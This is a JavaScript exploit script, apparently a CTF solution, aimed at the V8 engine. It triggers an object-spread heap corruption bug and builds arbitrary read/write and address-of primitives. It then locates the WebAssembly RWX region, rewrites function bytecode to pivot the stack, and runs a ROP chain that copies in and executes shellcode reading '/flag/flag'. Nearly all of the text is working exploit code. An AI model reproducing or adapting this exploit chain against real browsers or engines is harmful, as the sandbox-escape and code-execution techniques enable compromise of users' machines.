function hax1(a, b) {
    return a + b + 1;
}




function exploit() {
    //gc_minor();
    //gc_major();
    for(let i = 0; i < 1000000; i++) stable();
    gc_minor();
    gc_major();

    // setup wasm code
    let wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 1, 127, 0, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 17, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 102, 117, 110, 99, 0, 0, 10, 39, 1, 37, 0, 32, 0, 66, 223, 134, 251, 154, 156, 235, 48, 55, 3, 0, 32, 0, 66, 243, 201, 142, 6, 55, 3, 0, 32, 0, 66, 200, 154, 150, 131, 177, 24, 55, 3, 0, 11]);
    let wasmModule = new WebAssembly.Module(wasmCode);
    let wasmInstance = new WebAssembly.Instance(wasmModule);

    // vulnerability
    let a = {p0: 1, p1: 1, p2: 1, p3: 1, p4: 1, p5: 1, p6: 1, p7: 1, p8: 1};
    a.p9 = 1;
    a[0] = {};
    function throwaway() {
    return {...a, __proto__: null};
    }
    for (let j = 0; j < 100; ++j)  // IC
        throwaway();
    for (let key in a) a[key] = {};
    function func() {
    return {...a, __proto__: null};
    }
    for (let j = 0; j < 100; ++j)  // IC
    corrupted = func();


    // store buffer for arb read/write in OldSpace
    let victim2 = new ArrayBuffer(256);
    victim2.a = {};
    gc_major();

    // create temporary OOB primitives
    let b = [1.1,1.1,1.1];
    let victim = new ArrayBuffer(256);
    victim.a = {};

    // use bug to let us r/w from b
    corrupted.p9 = b;
    corrupted[1] = 255;
    if (b.length != 255) {
        print("b.length:");
        print(b.length);
        return false;
    }

    // setting up exploit primitives
    victim.a = victim2;
    props = ftoi(b[3]) >> 32n;
    offset = props+8n & 0xffn;
    base = props+8n >> 8n
    b[7] = itof(base << 32n);
    uint32view = new Uint32Array(victim);
    victim2_addr = BigInt(uint32view[offset/4n]) - 1n;
    b[7] = itof((victim2_addr >> 8n) << 32n);
    victim2_bs_offset = ((victim2_addr & 0xffn) / 4n) + 9n;
    gc_major();
    uint32view = new Uint32Array(victim);

    function sbx_read(addr) {
        if (addr > 0xffffffffff) {
            print("sbx_read too large!");
            return;
        }
        offset = addr & 0xffn;
        base = addr >> 8n;
        uint32view[victim2_bs_offset] = Number(base);
        uint32view[victim2_bs_offset - 1n] = Number(offset << 24n);
        uint32view2 = new Uint32Array(victim2);
        return BigInt(uint32view2[0]);
    }

    function sbx_write(addr, val) {
        if (addr > 0xffffffffff) {
            print("sbx_write too large!");
            return;
        }
        offset = addr & 0xffn;
        base = addr >> 8n;
        uint32view[victim2_bs_offset] = Number(base);
        uint32view[victim2_bs_offset - 1n] = Number(offset << 24n);
        uint32view2 = new Uint32Array(victim2);
        uint32view2[0] = Number(val);
    }

    function addr_of(obj) {
        victim2.a = obj;
        props = sbx_read(victim2_addr + 4n) - 1n;
        return sbx_read(props + 8n);
    }

    top_bits = sbx_read(0x1cn);
    print("top bits:");
    print(hex(top_bits));

    if (top_bits == 0) {
        return false;
    }


    print("read 0:");
    print(hex(sbx_read(0n)));

    // get address of rwx wasm area
    let wasm_instance_addr = addr_of(wasmInstance) - 1n;
    print("wasm instance addr:");
    print(hex(wasm_instance_addr));
    rwx_addr_high = sbx_read(wasm_instance_addr + 0x54n);
    rwx_addr_low = sbx_read(wasm_instance_addr + 0x50n);
    rwx = rwx_addr_low + (rwx_addr_high << 32n);

    var arr = new Uint8Array(wasmInstance.exports.memory.buffer,0,128);
    wasmInstance.exports.func(arr);

    print("wasm rwx address:");
    print(hex64(rwx));

    let pop_rdi = rwx + 0x71en;
    let ret_instr = pop_rdi + 1n;
    let pop_rsi = rwx + 0x720n;
    let pop_rcx = rwx + 0x722n;
    let rep_movs = rwx + 0x736n;
    let fix_rsp = rwx + 0x740n;

    // print(hex64(fix_rsp));

    /*
    >>> [i for i in bytearray(asm(shellcraft.cat("/flag/flag")))]
    [104, 96, 102, 1, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 47, 102, 108, 97, 103, 47, 102, 108, 80, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 106, 1, 95, 153, 15, 5]
    */

    var code = new Uint8Array([104, 96, 102, 1, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 47, 102, 108, 97, 103, 47, 102, 108, 80, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 106, 1, 95, 153, 15, 5])
    var buf = new ArrayBuffer(2048);
    var shellcode = new DataView(buf);
    for(let i = 0; i < code.length; i++) {
        shellcode.setUint8(i,code[i]);
    }

    buf_addr = addr_of(buf) - 1n;
    bstore_high = sbx_read(buf_addr + 0x24n);
    bstore_low = sbx_read(buf_addr + 0x20n);
    var payload_addr = (bstore_low + (bstore_high << 32n)) >> 24n;
    payload_addr += top_bits << 32n;

    print("payload located at:");
    print(hex64(payload_addr));

    let dest_rwx_addr = rwx + 0x100n;

    print("payload destination:");
    print(hex64(dest_rwx_addr));


    for(let i = 0; i< 100; i++) hax1(1, 2);
    var shared_info1 = sbx_read(addr_of(hax1)-1n+0x10n);
    var bytecode1 = sbx_read(shared_info1-1n+0x4n) - 1n + 0x20n;


    let code_addr = fix_rsp;

    // modify bytecode to put argument in rbp (https://github.com/google/google-ctf/tree/master/2023/quals/sandbox-v8box/solution)
    sbx_write(bytecode1, 0x0018030b);
    sbx_write(bytecode1 + 4n, 0xaaaaaaaa);


    // create a region to pivot the stack to
    let new_stack = new ArrayBuffer(0x1000);
    new_stack[0] = {};
    // let new_stack_lmnt_addr = sbx_read(addr_of(new_stack) - 1n + 8n) - 1n;
    let new_stack_view = new BigUint64Array(new_stack);

    // get address of backing store (new stack location)
    let new_stack_addr = addr_of(new_stack)-1n;
    print("new_stack_addr:");
    print(hex64(new_stack_addr));
    let stack_bs_addr = (top_bits << 32n) + ((sbx_read(new_stack_addr + 0x20n) + (sbx_read(new_stack_addr + 0x24n) << 32n)) >> 24n);
    print("stack_bs_addr:");
    print(hex64(stack_bs_addr));
    let stack_top = stack_bs_addr + 0x400n;

    let stack_top_offset = stack_top - (top_bits << 32n);
    // rop chain
    sbx_write(stack_top_offset + 0x08n, ret_instr & 0xffffffffn);
    sbx_write(stack_top_offset + 0x0cn, ret_instr >> 32n);
    sbx_write(stack_top_offset + 0x10n, ret_instr & 0xffffffffn);
    sbx_write(stack_top_offset + 0x14n, ret_instr >> 32n);
    sbx_write(stack_top_offset + 0x18n, ret_instr & 0xffffffffn);
    sbx_write(stack_top_offset + 0x1cn, ret_instr >> 32n);
    sbx_write(stack_top_offset + 0x20n, pop_rdi & 0xffffffffn);
    sbx_write(stack_top_offset + 0x24n, pop_rdi >> 32n);
    sbx_write(stack_top_offset + 0x28n, dest_rwx_addr & 0xffffffffn);
    sbx_write(stack_top_offset + 0x2cn, dest_rwx_addr >> 32n);
    sbx_write(stack_top_offset + 0x30n, pop_rsi & 0xffffffffn);
    sbx_write(stack_top_offset + 0x34n, pop_rsi >> 32n);
    sbx_write(stack_top_offset + 0x38n, payload_addr & 0xffffffffn);
    sbx_write(stack_top_offset + 0x3cn, payload_addr >> 32n);
    sbx_write(stack_top_offset + 0x40n, pop_rcx & 0xffffffffn);
    sbx_write(stack_top_offset + 0x44n, pop_rcx >> 32n);
    sbx_write(stack_top_offset + 0x48n, BigInt(code.length) & 0xffffffffn);
    sbx_write(stack_top_offset + 0x4cn, BigInt(code.length) >> 32n);
    sbx_write(stack_top_offset + 0x50n, rep_movs & 0xffffffffn);
    sbx_write(stack_top_offset + 0x54n, rep_movs >> 32n);
    sbx_write(stack_top_offset + 0x58n, dest_rwx_addr & 0xffffffffn);
    sbx_write(stack_top_offset + 0x5cn, dest_rwx_addr >> 32n);


    let stack_view_addr = addr_of(new_stack_view) - 1n;
    print("stack_view_addr:");
    print(hex64(stack_view_addr));
    sbx_write(stack_view_addr - 0x10n + 1n, ((stack_bs_addr - 0x17n) & 0xffffffffn));
    sbx_write(stack_view_addr - 0x0cn + 1n, ((stack_bs_addr >> 32n) & 0xffffffffn));

    let rsp_offset = (stack_top - ((top_bits << 32n) + addr_of(new_stack_view))) / 8n;
    sbx_write(stack_view_addr - 0x18n + 1n, rsp_offset & 0xffffffffn);
    sbx_write(stack_view_addr - 0x14n + 1n, (rsp_offset >> 32n) & 0xffffffffn);


    new_stack_view[0] = stack_view_addr + 0x200n;

    // create new rbp
    sbx_write(stack_view_addr + 1n, (stack_top & 0xffffffffn));
    sbx_write(stack_view_addr + 4n + 1n, ((stack_top >> 32n) & 0xffffffffn));

    // this is the ret address placed at rbp+8
    sbx_write(stack_view_addr + 0x8n + 1n, (code_addr & 0xffffffffn));
    sbx_write(stack_view_addr + 0xcn + 1n, ((code_addr >> 32n) & 0xffffffffn));


    print("About to run modified bytecode:");
    hax1(new_stack_view);
}
